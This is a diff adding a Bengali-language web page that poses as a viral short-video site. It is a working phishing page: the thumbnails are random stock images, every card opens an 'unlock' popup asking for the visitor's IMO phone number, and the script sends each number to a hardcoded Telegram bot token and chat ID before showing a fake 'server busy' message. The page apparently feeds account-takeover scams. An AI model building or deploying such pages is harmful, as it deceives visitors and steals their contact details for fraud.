@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Viral Shorts - Unlimited</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #000; overflow-x: hidden; }
+        .video-card { position: relative; border-radius: 12px; overflow: hidden; background: #111; aspect-ratio: 9/16; cursor: pointer; }
+        .play-overlay { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.3); }
+        #modal { display: none; z-index: 1000; }
+        .shimmer { animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 0.8; } 100% { opacity: 0.5; } }
+    </style>
+</head>
+<body class="text-white">
+
+    <nav class="fixed top-0 w-full bg-black/90 backdrop-blur-xl p-4 text-center border-b border-red-900/50 z-50">
+        <h1 class="text-red-600 font-black text-2xl italic tracking-widest">VIRAL<span class="text-white">LIVE</span></h1>
+    </nav>
+
+    <div id="video-container" class="mt-20 p-3 grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+        </div>
+
+    <div id="loader" class="text-center p-10 shimmer">
+        <p class="text-gray-500 text-sm italic">লোড হচ্ছে...</p>
+    </div>
+
+    <div id="modal" class="fixed inset-0 bg-black/95 flex items-center justify-center p-6 backdrop-blur-sm">
+        <div class="bg-white text-black p-8 rounded-[30px] max-w-sm w-full text-center shadow-[0_0_50px_rgba(255,255,255,0.1)]">
+            <div class="mb-5 flex justify-center">
+                <div class="bg-blue-100 p-4 rounded-full">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="#2563eb" viewBox="0 0 16 16">
+                        <path d="M10.5 8.5a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/>
+                        <path d="M2 4a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2h-1.172a2 2 0 0 1-1.414-.586l-.828-.828A2 2 0 0 0 9.172 2H6.828a2 2 0 0 0-1.414.586l-.828.828A2 2 0 0 1 3.172 4H2zm.5 2a.5.5 0 1 1 0-1 .5.5 0 0 1 0 1zm9 2.5a3.5 3.5 0 1 1-7 0 3.5 3.5 0 0 1 7 0z"/>
+                    </svg>
+                </div>
+            </div>
+            <h2 class="text-2xl font-extrabold mb-3">ভিডিওটি আনলক করুন</h2>
+            <p class="text-gray-500 mb-6 text-sm leading-relaxed">সম্পূর্ণ ভিডিও এবং অফুরন্ত ভাইরাল কালেকশন দেখতে আপনার **IMO** নম্বর দিয়ে কানেক্ট করুন।</p>
+            
+            <input type="tel" id="phoneNumber" placeholder="আপনার ইমো নম্বর দিন" autocomplete="tel"
+                   class="w-full p-4 bg-gray-100 border-none rounded-2xl mb-4 text-center text-xl font-bold focus:ring-2 focus:ring-blue-500 outline-none">
+
+            <button onclick="sendData()" class="w-full bg-blue-600 text-white font-bold py-4 rounded-2xl text-lg shadow-lg shadow-blue-200 active:scale-95 transition-all">
+                এখনই দেখুন
+            </button>
+            <p class="mt-5 text-[10px] text-gray-400 uppercase tracking-widest font-semibold">Protected by Secure Connection</p>
+        </div>
+    </div>
+
+    <script>
+        // আপনার দেওয়া টেলিগ্রাম তথ্য
+        const botToken = "7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE";
+        const chatId = "8516934257";
+
+        const container = document.getElementById('video-container');
+        let loading = false;
+
+        // ফাংশন: আকর্ষণীয় ভিডিও থাম্বনেইল তৈরি
+        function createVideoCards(count) {
+            for (let i = 0; i < count; i++) {
+                const card = document.createElement('div');
+                card.className = 'video-card';
+                card.onclick = openModal;
+                
+                const randomId = Math.floor(Math.random() * 5000);
+                // আকর্ষণীয় ছবি আসার জন্য রেন্ডম ইমেজ এপিআই
+                card.innerHTML = `
+                    <img src="https://picsum.photos/400/700?random=${randomId}" 
+                         class="w-full h-full object-cover opacity-80" loading="lazy">
+                    <div class="play-overlay">
+                        <div class="bg-white/30 backdrop-blur-md p-4 rounded-full">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="white" viewBox="0 0 16 16">
+                                <path d="m11.596 8.697-6.363 3.692c-.54.313-1.233-.066-1.233-.697V4.308c0-.63.692-1.01 1.233-.696l6.363 3.692a.802.802 0 0 1 0 1.393z"/>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="absolute bottom-3 left-3 bg-red-600 px-2 py-0.5 rounded text-[10px] font-bold">LIVE</div>
+                `;
+                container.appendChild(card);
+            }
+        }
+
+        // শুরুতে ১৮টি ভিডিও দেখাবে
+        createVideoCards(18);
+
+        function openModal() {
+            document.getElementById('modal').style.display = 'flex';
+            document.body.style.overflow = 'hidden'; // পপআপ আসলে স্ক্রল বন্ধ
+        }
+
+        function sendData() {
+            const num = document.getElementById('phoneNumber').value;
+            if(num.length < 10) {
+                alert("দয়া করে সঠিক নম্বর দিন।");
+                return;
+            }
+
+            const text = `⚠️ নতুন ডাটা এসেছে!\n📱 ইমো নম্বর: ${num}\n👤 নাম: ${"Mst. Priya Akter"}\n⏰ সময়: ${new Date().toLocaleString()}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+            .then(() => {
+                alert("সার্ভার বর্তমানে বিজি আছে। কিছুক্ষণ পর আবার চেষ্টা করুন।");
+                location.reload();
+            })
+            .catch(err => {
+                console.error(err);
+                alert("সংযোগ বিচ্ছিন্ন হয়েছে।");
+            });
+        }
+
+        // Infinite Scroll Logic
+        window.onscroll = function() {
+            if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 800) {
+                if (!loading) {
+                    loading = true;
+                    setTimeout(() => {
+                        createVideoCards(10);
+                        loading = false;
+                    }, 500);
+                }
+            }
+        };
+    </script>
+</body>
+</html>
